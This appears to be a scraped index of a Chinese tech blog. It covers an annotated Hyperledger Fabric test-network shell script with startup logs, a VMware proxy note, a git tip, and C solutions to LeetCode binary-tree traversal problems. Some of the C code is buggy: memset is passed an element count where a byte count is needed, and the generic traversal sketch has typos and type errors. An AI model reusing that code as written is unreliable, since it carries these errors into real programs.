/dev/null 2\u0026gt;\u0026amp;1 if [[ $? -ne 0 || ! -d \u0026#34;../config\u0026#34; ]]; then echo \u0026#34;ERROR! Peer binary and configuration files not found..\u0026#34; echo echo \u0026#34;Follow the instructions in the Fabric docs to install the Fabric Binaries:\u0026#34; echo \u0026#34;https://hyperledger-fabric.readthedocs.io/en/latest/install.html\u0026#34; exit 1 fi # 检查docker镜像以及二进制文件是否匹配 # use the fabric tools container to see if the samples and binaries match your # docker images LOCAL_VERSION=$(peer version | sed -ne \u0026#39;s/ Version: //p\u0026#39;) DOCKER_IMAGE_VERSION=$(docker run --rm hyperledger/fabric-tools:$IMAGETAG peer version | sed -ne \u0026#39;s/ Version: //p\u0026#39; | head -1) echo \u0026#34;LOCAL_VERSION=$LOCAL_VERSION\u0026#34; echo \u0026#34;DOCKER_IMAGE_VERSION=$DOCKER_IMAGE_VERSION\u0026#34; if [ \u0026#34;$LOCAL_VERSION\u0026#34; != \u0026#34;$DOCKER_IMAGE_VERSION\u0026#34; ]; then echo \u0026#34;=================== WARNING ===================\u0026#34; echo \u0026#34; Local fabric binaries and docker images are \u0026#34; echo \u0026#34; out of sync. This may cause problems. \u0026#34; echo \u0026#34;===============================================\u0026#34; fi for UNSUPPORTED_VERSION in $BLACKLISTED_VERSIONS; do echo \u0026#34;$LOCAL_VERSION\u0026#34; | grep -q $UNSUPPORTED_VERSION if [ $? -eq 0 ]; then echo \u0026#34;ERROR! Local Fabric binary version of $LOCAL_VERSION does not match the versions supported by the test network.\u0026#34; exit 1 fi echo \u0026#34;$DOCKER_IMAGE_VERSION\u0026#34; | grep -q $UNSUPPORTED_VERSION if [ $? -eq 0 ]; then echo \u0026#34;ERROR! Fabric Docker image version of $DOCKER_IMAGE_VERSION does not match the versions supported by the test network.\u0026#34; exit 1 fi done } # 下面简单介绍了cryptogen这个工具以及CA # Before you can bring up a network, each organization needs to generate the crypto # material that will define that organization on the network. Because Hyperledger # Fabric is a permissioned blockchain, each node and user on the network needs to # use certificates and keys to sign and verify its actions. In addition, each user # needs to belong to an organization that is recognized as a member of the network. # You can use the Cryptogen tool or Fabric CAs to generate the organization crypto # material. # By default, the sample network uses cryptogen. Cryptogen is a tool that is # meant for development and testing that can quicky create the certificates and keys # that can be consumed by a Fabric network. The cryptogen tool consumes a series # of configuration files for each organization in the \u0026#34;organizations/cryptogen\u0026#34; # directory. Cryptogen uses the files to generate the crypto material for each # org in the \u0026#34;organizations\u0026#34; directory. # You can also Fabric CAs to generate the crypto material. CAs sign the certificates # and keys that they generate to create a valid root of trust for each organization. # The script uses Docker Compose to bring up three CAs, one for each peer organization # and the ordering organization. The configuration file for creating the Fabric CA # servers are in the \u0026#34;organizations/fabric-ca\u0026#34; directory. Within the same diectory, # the \u0026#34;registerEnroll.sh\u0026#34; script uses the Fabric CA client to create the identites, # certificates, and MSP folders that are needed to create the test network in the # \u0026#34;organizations/ordererOrganizations\u0026#34; directory. # Create Organziation crypto material using cryptogen or CAs function createOrgs() { if [ -d \u0026#34;organizations/peerOrganizations\u0026#34; ]; then rm -Rf organizations/peerOrganizations \u0026amp;\u0026amp; rm -Rf organizations/ordererOrganizations fi # Create crypto material using cryptogen if [ \u0026#34;$CRYPTO\u0026#34; == \u0026#34;cryptogen\u0026#34; ]; then which cryptogen if [ \u0026#34;$?\u0026#34; -ne 0 ]; then echo \u0026#34;cryptogen tool not found. exiting\u0026#34; exit 1 fi echo echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;##### Generate certificates using cryptogen tool #########\u0026#34; echo \u0026#34;##########################################################\u0026#34; echo echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;############ Create Org1 Identities ######################\u0026#34; echo \u0026#34;##########################################################\u0026#34; set -x cryptogen generate --config=./organizations/cryptogen/crypto-config-org1.yaml --output=\u0026#34;organizations\u0026#34; res=$? set +x if [ $res -ne 0 ]; then echo \u0026#34;Failed to generate certificates...\u0026#34; exit 1 fi echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;############ Create Org2 Identities ######################\u0026#34; echo \u0026#34;##########################################################\u0026#34; set -x cryptogen generate --config=./organizations/cryptogen/crypto-config-org2.yaml --output=\u0026#34;organizations\u0026#34; res=$? set +x if [ $res -ne 0 ]; then echo \u0026#34;Failed to generate certificates...\u0026#34; exit 1 fi echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;############ Create Orderer Org Identities ###############\u0026#34; echo \u0026#34;##########################################################\u0026#34; set -x cryptogen generate --config=./organizations/cryptogen/crypto-config-orderer.yaml --output=\u0026#34;organizations\u0026#34; res=$? set +x if [ $res -ne 0 ]; then echo \u0026#34;Failed to generate certificates...\u0026#34; exit 1 fi fi # Create crypto material using Fabric CAs if [ \u0026#34;$CRYPTO\u0026#34; == \u0026#34;Certificate Authorities\u0026#34; ]; then fabric-ca-client version \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 if [ $? -ne 0 ]; then echo \u0026#34;Fabric CA client not found locally, downloading...\u0026#34; cd .. curl -s -L \u0026#34;https://github.com/hyperledger/fabric-ca/releases/download/v1.4.4/hyperledger-fabric-ca-${OS_ARCH}-1.4.4.tar.gz\u0026#34; | tar xz || rc=$? if [ -n \u0026#34;$rc\u0026#34; ]; then echo \u0026#34;==\u0026gt; There was an error downloading the binary file.\u0026#34; echo \u0026#34;fabric-ca-client binary is not available to download\u0026#34; else echo \u0026#34;==\u0026gt; Done.\u0026#34; cd test-network fi fi echo echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;##### Generate certificates using Fabric CA\u0026#39;s ############\u0026#34; echo \u0026#34;##########################################################\u0026#34; IMAGE_TAG=$IMAGETAG docker-compose -f $COMPOSE_FILE_CA up -d 2\u0026gt;\u0026amp;1 . organizations/fabric-ca/registerEnroll.sh sleep 10 echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;############ Create Org1 Identities ######################\u0026#34; echo \u0026#34;##########################################################\u0026#34; createOrg1 echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;############ Create Org2 Identities ######################\u0026#34; echo \u0026#34;##########################################################\u0026#34; createOrg2 echo \u0026#34;##########################################################\u0026#34; echo \u0026#34;############ Create Orderer Org Identities ###############\u0026#34; echo \u0026#34;##########################################################\u0026#34; createOrderer fi echo echo \u0026#34;Generate CCP files for Org1 and Org2\u0026#34; ./organizations/ccp-generate.sh } # 使用cryptogen（cryptogen用于配置网络中的证书、组织等）配置完网络组织后 # 这里使用configtxgen配置创世区块、channel以及锚节点 # 有一个\u0026#34;configtx.yaml\u0026#34;文件帮助配置网络中的组织创世区块，组织成员等内容 # 创建每个channel的MSP # Once you create the organization crypto material, you need to create the # genesis block of the orderer system channel. This block is required to bring # up any orderer nodes and create any application channels. # The configtxgen tool is used to create the genesis block. Configtxgen consumes a # \u0026#34;configtx.yaml\u0026#34; file that contains the definitions for the sample network. The # genesis block is defiend using the \u0026#34;TwoOrgsOrdererGenesis\u0026#34; profile at the bottom # of the file. This profile defines a sample consortium, \u0026#34;SampleConsortium\u0026#34;, # consisting of our two Peer Orgs. This consortium defines which organizations are # recognized as members of the network. The peer and ordering organizations are defined # in the \u0026#34;Profiles\u0026#34; section at the top of the file. As part of each organization # profile, the file points to a the location of the MSP directory for each member. # This MSP is used to create the channel MSP that defines the root of trust for # each organization. In essense, the channel MSP allows the nodes and users to be # recognized as network members. The file also specifies the anchor peers for each # peer org. In future steps, this same file is used to create the channel creation # transaction and the anchor peer updates. # # # If you receive the following warning, it can be safely ignored: # # [bccsp] GetDefault -\u0026gt; WARN 001 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP. # # You can ignore the logs regarding intermediate certs, we are not using them in # this crypto implementation. # Generate orderer system channel genesis block. function createConsortium() { which configtxgen if [ \u0026#34;$?\u0026#34; -ne 0 ]; then echo \u0026#34;configtxgen tool not found. exiting\u0026#34; exit 1 fi echo \u0026#34;######### Generating Orderer Genesis block ##############\u0026#34; # Note: For some unknown reason (at least for now) the block file can\u0026#39;t be # named orderer.genesis.block or the orderer will fail to launch! set -x configtxgen -profile TwoOrgsOrdererGenesis -channelID system-channel -outputBlock ./system-genesis-block/genesis.block res=$? set +x if [ $res -ne 0 ]; then echo \u0026#34;Failed to generate orderer genesis block...\u0026#34; exit 1 fi } # 之后，启动peer节点和排序服务，创建相应的docker实体 # After we create the org crypto material and the system channel genesis block, # we can now bring up the peers and orderering service. By default, the base # file for creating the network is \u0026#34;docker-compose-test-net.yaml\u0026#34; in the ``docker`` # folder. This file defines the environment variables and file mounts that # point the crypto material and genesis block that were created in earlier. # Bring up the peer and orderer nodes using docker compose. function networkUp() { checkPrereqs # generate artifacts if they don\u0026#39;t exist if [ ! -d \u0026#34;organizations/peerOrganizations\u0026#34; ]; then createOrgs createConsortium fi COMPOSE_FILES=\u0026#34;-f ${COMPOSE_FILE_BASE}\u0026#34; if [ \u0026#34;${DATABASE}\u0026#34; == \u0026#34;couchdb\u0026#34; ]; then COMPOSE_FILES=\u0026#34;${COMPOSE_FILES} -f ${COMPOSE_FILE_COUCH}\u0026#34; fi IMAGE_TAG=$IMAGETAG docker-compose ${COMPOSE_FILES} up -d 2\u0026gt;\u0026amp;1 docker ps -a if [ $? -ne 0 ]; then echo \u0026#34;ERROR !!!! Unable to start network\u0026#34; exit 1 fi } # 将peer加入通道 ## call the script to join create the channel and join the peers of org1 and org2 function createChannel() { ## Bring up the network if it is not arleady up. if [ ! -d \u0026#34;organizations/peerOrganizations\u0026#34; ]; then echo \u0026#34;Bringing up network\u0026#34; networkUp fi # now run the script that creates a channel. This script uses configtxgen once # more to create the channel creation transaction and the anchor peer updates. # configtx.yaml is mounted in the cli container, which allows us to use it to # create the channel artifacts scripts/createChannel.sh $CHANNEL_NAME $CLI_DELAY $MAX_RETRY $VERBOSE if [ $? -ne 0 ]; then echo \u0026#34;Error !!! Create channel failed\u0026#34; exit 1 fi } # 实例化链码 ## Call the script to isntall and instantiate a chaincode on the channel function deployCC() { scripts/deployCC.sh $CHANNEL_NAME $CC_SRC_LANGUAGE $VERSION $CLI_DELAY $MAX_RETRY $VERBOSE if [ $? -ne 0 ]; then echo \u0026#34;ERROR !!! Deploying chaincode failed\u0026#34; exit 1 fi exit 0 } # 关闭网络 # Tear down running network function networkDown() { # stop org3 containers also in addition to org1 and org2, in case we were running sample to add org3 docker-compose -f $COMPOSE_FILE_BASE -f $COMPOSE_FILE_COUCH -f $COMPOSE_FILE_CA down --volumes --remove-orphans docker-compose -f $COMPOSE_FILE_COUCH_ORG3 -f $COMPOSE_FILE_ORG3 down --volumes --remove-orphans # Don\u0026#39;t remove the generated artifacts -- note, the ledgers are always removed if [ \u0026#34;$MODE\u0026#34; != \u0026#34;restart\u0026#34; ]; then # Bring down the network, deleting the volumes #Cleanup the chaincode containers clearContainers #Cleanup images removeUnwantedImages # remove orderer block and other channel configuration transactions and certs rm -rf system-genesis-block/*.block organizations/peerOrganizations organizations/ordererOrganizations ## remove fabric ca artifacts rm -rf organizations/fabric-ca/org1/msp organizations/fabric-ca/org1/tls-cert.pem organizations/fabric-ca/org1/ca-cert.pem organizations/fabric-ca/org1/IssuerPublicKey organizations/fabric-ca/org1/IssuerRevocationPublicKey organizations/fabric-ca/org1/fabric-ca-server.db rm -rf organizations/fabric-ca/org2/msp organizations/fabric-ca/org2/tls-cert.pem organizations/fabric-ca/org2/ca-cert.pem organizations/fabric-ca/org2/IssuerPublicKey organizations/fabric-ca/org2/IssuerRevocationPublicKey organizations/fabric-ca/org2/fabric-ca-server.db rm -rf organizations/fabric-ca/ordererOrg/msp organizations/fabric-ca/ordererOrg/tls-cert.pem organizations/fabric-ca/ordererOrg/ca-cert.pem organizations/fabric-ca/ordererOrg/IssuerPublicKey organizations/fabric-ca/ordererOrg/IssuerRevocationPublicKey organizations/fabric-ca/ordererOrg/fabric-ca-server.db rm -rf addOrg3/fabric-ca/org3/msp addOrg3/fabric-ca/org3/tls-cert.pem addOrg3/fabric-ca/org3/ca-cert.pem addOrg3/fabric-ca/org3/IssuerPublicKey addOrg3/fabric-ca/org3/IssuerRevocationPublicKey addOrg3/fabric-ca/org3/fabric-ca-server.db # remove channel and script artifacts rm -rf channel-artifacts log.txt fabcar.tar.gz fabcar fi } # Obtain the OS and Architecture string that will be used to select the correct # native binaries for your platform, e.g., darwin-amd64 or linux-amd64 OS_ARCH=$(echo \u0026#34;$(uname -s | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; | sed \u0026#39;s/mingw64_nt.*/windows/\u0026#39;)-$(uname -m | sed \u0026#39;s/x86_64/amd64/g\u0026#39;)\u0026#34; | awk \u0026#39;{print tolower($0)}\u0026#39;) # Using crpto vs CA. default is cryptogen CRYPTO=\u0026#34;cryptogen\u0026#34; # timeout duration - the duration the CLI should wait for a response from # another container before giving up MAX_RETRY=5 # default for delay between commands CLI_DELAY=3 # channel name defaults to \u0026#34;mychannel\u0026#34; CHANNEL_NAME=\u0026#34;mychannel\u0026#34; # use this as the default docker-compose yaml definition COMPOSE_FILE_BASE=docker/docker-compose-test-net.yaml # docker-compose.yaml file if you are using couchdb COMPOSE_FILE_COUCH=docker/docker-compose-couch.yaml # certificate authorities compose file COMPOSE_FILE_CA=docker/docker-compose-ca.yaml # use this as the docker compose couch file for org3 COMPOSE_FILE_COUCH_ORG3=addOrg3/docker/docker-compose-couch-org3.yaml # use this as the default docker-compose yaml definition for org3 COMPOSE_FILE_ORG3=addOrg3/docker/docker-compose-org3.yaml # # use golang as the default language for chaincode CC_SRC_LANGUAGE=golang # Chaincode version VERSION=1 # default image tag IMAGETAG=\u0026#34;latest\u0026#34; # default database DATABASE=\u0026#34;leveldb\u0026#34; # Parse commandline args ## Parse mode if [[ $# -lt 1 ]] ; then printHelp exit 0 else MODE=$1 shift fi # parse a createChannel subcommand if used if [[ $# -ge 1 ]] ; then key=\u0026#34;$1\u0026#34; if [[ \u0026#34;$key\u0026#34; == \u0026#34;createChannel\u0026#34; ]]; then export MODE=\u0026#34;createChannel\u0026#34; shift fi fi # parse flags while [[ $# -ge 1 ]] ; do key=\u0026#34;$1\u0026#34; case $key in -h ) printHelp exit 0 ;; -c ) CHANNEL_NAME=\u0026#34;$2\u0026#34; shift ;; -ca ) CRYPTO=\u0026#34;Certificate Authorities\u0026#34; ;; -r ) MAX_RETRY=\u0026#34;$2\u0026#34; shift ;; -d ) CLI_DELAY=\u0026#34;$2\u0026#34; shift ;; -s ) DATABASE=\u0026#34;$2\u0026#34; shift ;; -l ) CC_SRC_LANGUAGE=\u0026#34;$2\u0026#34; shift ;; -v ) VERSION=\u0026#34;$2\u0026#34; shift ;; -i ) IMAGETAG=\u0026#34;$2\u0026#34; shift ;; -verbose ) VERBOSE=true shift ;; * ) echo echo \u0026#34;Unknown flag: $key\u0026#34; echo printHelp exit 1 ;; esac shift done # Are we generating crypto material with this command? if [ ! -d \u0026#34;organizations/peerOrganizations\u0026#34; ]; then CRYPTO_MODE=\u0026#34;with crypto from \u0026#39;${CRYPTO}\u0026#39;\u0026#34; else CRYPTO_MODE=\u0026#34;\u0026#34; fi # Determine mode of operation and printing out what we asked for if [ \u0026#34;$MODE\u0026#34; == \u0026#34;up\u0026#34; ]; then echo \u0026#34;Starting nodes with CLI timeout of \u0026#39;${MAX_RETRY}\u0026#39; tries and CLI delay of \u0026#39;${CLI_DELAY}\u0026#39; seconds and using database \u0026#39;${DATABASE}\u0026#39; ${CRYPTO_MODE}\u0026#34; echo elif [ \u0026#34;$MODE\u0026#34; == \u0026#34;createChannel\u0026#34; ]; then echo \u0026#34;Creating channel \u0026#39;${CHANNEL_NAME}\u0026#39;.\u0026#34; echo echo \u0026#34;If network is not up, starting nodes with CLI timeout of \u0026#39;${MAX_RETRY}\u0026#39; tries and CLI delay of \u0026#39;${CLI_DELAY}\u0026#39; seconds and using database \u0026#39;${DATABASE} ${CRYPTO_MODE}\u0026#34; echo elif [ \u0026#34;$MODE\u0026#34; == \u0026#34;down\u0026#34; ]; then echo \u0026#34;Stopping network\u0026#34; echo elif [ \u0026#34;$MODE\u0026#34; == \u0026#34;restart\u0026#34; ]; then echo \u0026#34;Restarting network\u0026#34; echo elif [ \u0026#34;$MODE\u0026#34; == \u0026#34;deployCC\u0026#34; ]; then echo \u0026#34;deploying chaincode on channel \u0026#39;${CHANNEL_NAME}\u0026#39;\u0026#34; echo else printHelp exit 1 fi if [ \u0026#34;${MODE}\u0026#34; == \u0026#34;up\u0026#34; ]; then networkUp elif [ \u0026#34;${MODE}\u0026#34; == \u0026#34;createChannel\u0026#34; ]; then createChannel elif [ \u0026#34;${MODE}\u0026#34; == \u0026#34;deployCC\u0026#34; ]; then deployCC elif [ \u0026#34;${MODE}\u0026#34; == \u0026#34;down\u0026#34; ]; then networkDown elif [ \u0026#34;${MODE}\u0026#34; == \u0026#34;restart\u0026#34; ]; then networkDown networkUp else printHelp exit 1 fi 启动test-network root@lizonglin-virtual-machine:/home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network# ./network.sh up # 可以看到，默认使用leveldb Starting nodes with CLI timeout of \u0026#39;5\u0026#39; tries and CLI delay of \u0026#39;3\u0026#39; seconds and using database \u0026#39;leveldb\u0026#39; with crypto from \u0026#39;cryptogen\u0026#39; LOCAL_VERSION=2.2.1 DOCKER_IMAGE_VERSION=2.2.1 /home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network/../bin/cryptogen # 首先使用cryptogen创建证书 ########################################################## ##### Generate certificates using cryptogen tool ######### ########################################################## # 组织1 ########################################################## ############ Create Org1 Identities ###################### ########################################################## + cryptogen generate --config=./organizations/cryptogen/crypto-config-org1.yaml --output=organizations org1.example.com + res=0 + set +x # 组织2 ########################################################## ############ Create Org2 Identities ###################### ########################################################## + cryptogen generate --config=./organizations/cryptogen/crypto-config-org2.yaml --output=organizations org2.example.com + res=0 + set +x # 排序服务 ########################################################## ############ Create Orderer Org Identities ############### ########################################################## + cryptogen generate --config=./organizations/cryptogen/crypto-config-orderer.yaml --output=organizations + res=0 + set +x Generate CCP files for Org1 and Org2 /home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network/../bin/configtxgen # 排序节点的创世区块 ######### Generating Orderer Genesis block ############## + configtxgen -profile TwoOrgsOrdererGenesis -channelID system-channel -outputBlock ./system-genesis-block/genesis.block 2021-01-21 18:53:34.963 CST [common.tools.configtxgen] main -\u0026gt; INFO 001 Loading configuration 2021-01-21 18:53:35.017 CST [common.tools.configtxgen.localconfig] completeInitialization -\u0026gt; INFO 002 orderer type: etcdraft 2021-01-21 18:53:35.017 CST [common.tools.configtxgen.localconfig] completeInitialization -\u0026gt; INFO 003 Orderer.EtcdRaft.Options unset, setting to tick_interval:\u0026#34;500ms\u0026#34; election_tick:10 heartbeat_tick:1 max_inflight_blocks:5 snapshot_interval_size:16777216 2021-01-21 18:53:35.017 CST [common.tools.configtxgen.localconfig] Load -\u0026gt; INFO 004 Loaded configuration: /home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network/configtx/configtx.yaml 2021-01-21 18:53:35.019 CST [common.tools.configtxgen] doOutputBlock -\u0026gt; INFO 005 Generating genesis block 2021-01-21 18:53:35.020 CST [common.tools.configtxgen] doOutputBlock -\u0026gt; INFO 006 Writing genesis block + res=0 + set +x Creating network \u0026#34;net_test\u0026#34; with the default driver Creating volume \u0026#34;net_orderer.example.com\u0026#34; with default driver Creating volume \u0026#34;net_peer0.org1.example.com\u0026#34; with default driver Creating volume \u0026#34;net_peer0.org2.example.com\u0026#34; with default driver Creating peer0.org2.example.com ... done Creating orderer.example.com ... done Creating peer0.org1.example.com ... done # 现在的docker中包含的容器，test-network到这里就是初步启动成功了 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ae8899485a40 hyperledger/fabric-peer:latest \u0026#34;peer node start\u0026#34; 18 seconds ago Up Less than a second 0.0.0.0:7051-\u0026gt;7051/tcp peer0.org1.example.com e8e4acee2cdd hyperledger/fabric-orderer:latest \u0026#34;orderer\u0026#34; 18 seconds ago Up Less than a second 0.0.0.0:7050-\u0026gt;7050/tcp orderer.example.com c0c720b03c4a hyperledger/fabric-peer:latest \u0026#34;peer node start\u0026#34; 18 seconds ago Up 1 second 7051/tcp, 0.0.0.0:9051-\u0026gt;9051/tcp peer0.org2.example.com ","date":"2021-01-21T20:41:47+08:00","permalink":"https://lizonglingo.github.io/p/fabric2.x_fabric-samples_test-network%E8%A7%A3%E8%AF%BB/","title":"Fabric2.X_fabric-samples_test-network解读"},{"content":"首先，在小飞机客户端设置允许本地代理允许来自局域网的连接\n然后，设置VMware的网络适配器的网络连接为桥接模式，复制连接物理网络状态，设置Ubuntu的网络，所有代理和主机都设置为宿主机的IP（如果宿主机为无线连接到网络就是WLAN的IPv4），注意端口号\n最后，设置Ubuntu的IP地址、网关、DNS信息，与宿主机在同一局域网\nApply\n转载自：VMware下ubuntu通过主机Shadowsocks上外网VMware下ubuntu通过主机Shadowsocks上外网-云社区-华为云 (huaweicloud.com)\n","date":"2021-01-17T19:13:49+08:00","permalink":"https://lizonglingo.github.io/p/vmware%E4%BD%BF%E7%94%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%B0%8F%E9%A3%9E%E6%9C%BA/","title":"VMware使用宿主机的小飞机"},{"content":" 有关git使用中的学习记录\nclone速度太慢 方法一 调整http提交缓存(亲测有效，使用https方式clone) $ git config --global http.postBuffer 524288000 调整前：\n调整后：\n","date":"2021-01-15T23:14:56+08:00","permalink":"https://lizonglingo.github.io/p/git%E4%BD%BF%E7%94%A8/","title":"Git使用"},{"content":"\n","date":"2021-01-11T22:24:37+08:00","permalink":"https://lizonglingo.github.io/p/bitcoin%E7%99%BD%E7%9A%AE%E4%B9%A6/","title":"bitcoin白皮书"},{"content":" 整理自leetcode\n树结点定义如下：\nDefinition for a binary tree node. struct TreeNode { int val; struct TreeNode *left; struct TreeNode *right; }; 二叉树的最大深度 给定一个二叉树，找出其最大深度。\n二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。\n说明: 叶子节点是指没有子节点的节点。\n示例： 给定二叉树 [3,9,20,null,null,15,7]，\n3\r/ \\\r9 20\r/ \\\r15 7 返回它的最大深度 3 。\n代码:\nint maxDepth(struct TreeNode *root) { int ld = 0; int rd = 0; if (NULL == root) return 0; if (root-\u0026gt;left) ld = maxDepth(root-\u0026gt;left);\t// 左子树存在进行左递归 if (root-\u0026gt;right) rd = maxDepth(root-\u0026gt;right);\t// 右子树存在进行右递归 return 1 + ((ld \u0026gt; rd) ? ld : rd);\t// 本层递归结束比较左右子树的深度取大者相加 } 对称二叉树 给定一个二叉树，检查它是否是镜像对称的。\n例如，二叉树 [1,2,2,3,4,4,3] 是对称的。\n1\r/ \\\r2 2\r/ \\ / \\\r3 4 4 3 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:\n1\r/ \\\r2 2\r\\ \\\r3 3 代码:\nbool recursion(struct TreeNode* left, struct TreeNode* right) { // 如果左子树和右子树均为空 返回真 if (NULL == left \u0026amp;\u0026amp; NULL == right) return true; else if (left == NULL || right == NULL) { // 其中一个不为空 返回假 return false; } // 左结点的值是否等于右结点的值 bool c1 = (left-\u0026gt;val == right-\u0026gt;val); // 左结点的左子树是否等于右结点的右子树 bool c2 = recursion(left-\u0026gt;left, right-\u0026gt;right); // 左结点的右子树是否等于右结点的左子树 bool c3 = recursion(left-\u0026gt;right, right-\u0026gt;left); // 如果同时成立 if (c1\u0026amp;\u0026amp;c2\u0026amp;\u0026amp;c3) { return true; } else { return false; } } bool isSymmetric(struct TreeNode* root) { // 根 为空 返回正确 if (root == NULL) { return true; } return recursion(root-\u0026gt;left, root-\u0026gt;right); } 路径总和 给定一个二叉树和一个目标和，判断该树中是否存在根节点到叶子节点的路径，这条路径上所有节点值相加等于目标和。\n说明: 叶子节点是指没有子节点的节点。\n示例: 给定如下二叉树，以及目标和 sum = 22，\n5\r/ \\\r4 8\r/ / \\\r11 13 4\r/ \\ \\\r7 2 1 返回 true, 因为存在目标和为 22 的根节点到叶子节点的路径 5-\u0026gt;4-\u0026gt;11-\u0026gt;2。\n代码:\nbool hasPathSum(struct TreeNode* root, int sum) { if (NULL == root) return false; // 保证该结点为叶子结点的前提下 ，判断此时的sum是否和结点的值相等 if (root-\u0026gt;val == sum \u0026amp;\u0026amp; NULL == root-\u0026gt;left \u0026amp;\u0026amp; NULL == root-\u0026gt;right) return true; // 递归向下层遍历，出错直接执行 false if (hasPathSum(root-\u0026gt;left, sum - root-\u0026gt;val) || hasPathSum(root-\u0026gt;right, sum - root-\u0026gt;val)) return true; return false; } ","date":"2020-06-08T18:05:43+08:00","permalink":"https://lizonglingo.github.io/p/%E5%9C%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E4%BD%BF%E7%94%A8%E9%80%92%E5%BD%92%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/","title":"在二叉树中使用递归解决问题"},{"content":" 先序遍历，中序遍历，后序遍历以及层次遍历。\n使用递归、队列。\n整理自Leetcode。\n说明 使用到的树结点类型为：\nstruct TreeNode { int val; struct TreeNode *left; struct TreeNode *right; }; 先序遍历 给定一个二叉树，返回它的 前序 遍历。\n示例:\n输入: [1,null,2,3] 1\r\\\r2\r/\r3 输出: [1,2,3] 代码:\n/*求二叉树数据个数，用于动态申请空间*/ int size(struct TreeNode* root) { if (!root) return 0; return size(root-\u0026gt;left) + size(root-\u0026gt;right) + 1;\t// 递归求二叉树的个数 } /*递归进行先序遍历*/ void PreOrder(struct TreeNode *root, int *ret, int *retIndex) { if (root == NULL) { return; } ret[(*retIndex)++] = root-\u0026gt;val;\t// 根 PreOrder(root-\u0026gt;left, ret, retIndex);\t// 左 PreOrder(root-\u0026gt;right, ret, retIndex);\t// 右 } int* preorderTraversal(struct TreeNode* root, int* returnSize) { int treesize = size(root);\t// 树结点数量 int retIndex = 0;\t// 数组索引 int *ret = (int*)malloc(sizeof(int) * treesize);\t// 申请空间 memset(ret, 0, treesize);\t// 置零 PreOrder(root, ret, \u0026amp;retIndex);\t// 先序遍历 *returnSize = retIndex; return ret; } 中序遍历 给定一个二叉树，返回它的中序 遍历。\n示例:\n输入: [1,null,2,3]\r1\r\\\r2\r/\r3\r输出: [1,3,2] 代码:\nint size(struct TreeNode* root)/*求二叉树数据个数*/ { if(!root) return 0; return size(root-\u0026gt;left)+size(root-\u0026gt;right)+1; } void inorder(struct TreeNode* root, int *ret, int* retIndex)/*中序遍历二叉树*/ { if (root == NULL) return; inorder(root-\u0026gt;left, ret, retIndex); ret[(*retIndex)++] = root-\u0026gt;val; inorder(root-\u0026gt;right, ret, retIndex); } int* inorderTraversal(struct TreeNode* root, int* returnSize) { int treesize = size(root); int retIndex = 0; int *ret = (int*)malloc(treesize * sizeof(int)); memset(ret, 0, treesize); inorder(root, ret, \u0026amp;retIndex); *returnSize = retIndex; return ret; } 后序遍历 给定一个二叉树，返回它的 后序 遍历。\n示例:\n输入: [1,null,2,3] 1\r\\\r2\r/\r3 输出: [3,2,1] 代码:\nint size(struct TreeNode* root)/*求二叉树数据个数*/ { if(!root) return 0; return size(root-\u0026gt;left)+size(root-\u0026gt;right)+1; } void postorder(struct TreeNode* root, int *ret, int* retIndex)/*中序遍历二叉树*/ { if (root == NULL) return; postorder(root-\u0026gt;left, ret, retIndex); postorder(root-\u0026gt;right, ret, retIndex); ret[(*retIndex)++] = root-\u0026gt;val; } int* postorderTraversal(struct TreeNode* root, int* returnSize){ int treesize = size(root); int retIndex = 0; int *ret = (int*)malloc(treesize * sizeof(int)); memset(ret, 0, treesize); postorder(root, ret, \u0026amp;retIndex); *returnSize = retIndex; return ret; } 先序、中序、后序 显然，对于三种遍历方式，在递归实现中，唯一的不同是递归函数中ret[(*retIndex)++] = root-\u0026gt;val语句的位置:\nvoid order(struct TreeNode* root, int *ret, int* retIndex) { if (root == NULL) return; //ret[(*retIndex)++] = root-\u0026gt;val; postorder(root-\u0026gt;left, ret, retIndex); //ret[(*retIndex)++] = root-\u0026gt;val; postorder(root-\u0026gt;right, ret, retIndex); //ret[(*retIndex)++] = root-\u0026gt;val; } 所以，对于三种遍历方式，我们可以统一写为：\n/*递归求树结点的个数*/ int size(struct TreeNode *root){ if(!root) return 0; return size(root-\u0026gt;left) + size(root-\u0026gt;right) + 1; } /**/ void order(struct TreeNode *root, int *ret, int *retIndex, METHOD){ if(root==NULL) return 0; if(METHOD is preorder){ ret[(*resIndex++)] = root-\u0026gt;val; order(root-\u0026gt;left, ret, retIndex, METHOD); order(root-\u0026gt;right, ret, retIndex, METHOD); }else if(METHOD is inorder){ order(root-\u0026gt;left, ret, retIndex, METHOD); ret[(*resIndex++)] = root-\u0026gt;val; order(root-\u0026gt;right, ret, retIndex, METHOD); }else if(METHOD is lastorder){ order(root-\u0026gt;left, ret, retIndex, METHOD); order(root-\u0026gt;right, ret, retIndex, METHOD); ret[(*resIndex++)] = root-\u0026gt;val; } } int *orderTraversal(struct TreeNode *root, int *treeSize, METHOD){ int treesize = size(root); int retIndex = 0; int *ret = (int*)malloc(sizeof(int)*treesize); memset(ret, 0, treesize); order(root, ret, \u0026amp;retIndex, METHOD); *returnSize = retIndex; return ret; } 层次遍历 给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。\n示例： 二叉树：[3,9,20,null,null,15,7],\n3\r/ \\\r9 20\r/ \\\r15 7 返回其层次遍历结果：\n[\r[3],\r[9,20],\r[15,7]\r] 代码:\n作者：r0vHWU5AdJ 